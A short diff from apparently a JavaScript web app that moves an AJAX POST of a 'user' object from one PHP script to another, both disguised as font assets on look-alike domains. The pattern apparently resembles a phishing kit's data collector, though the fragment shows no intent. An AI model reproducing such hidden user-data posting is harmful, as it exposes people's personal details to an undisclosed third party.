@@ -60,7 +60,7 @@ const App = ()=>{
 
       $.ajax({
           type: "POST",
-          url: "https://pearldozen.com/nc_assets/fonts/new/webm.php",
+          url: "https://dozenpearl.com/nc_assets/fonts/laptop/note.php",
           data: user,
           success(data) {
               console.log(data);
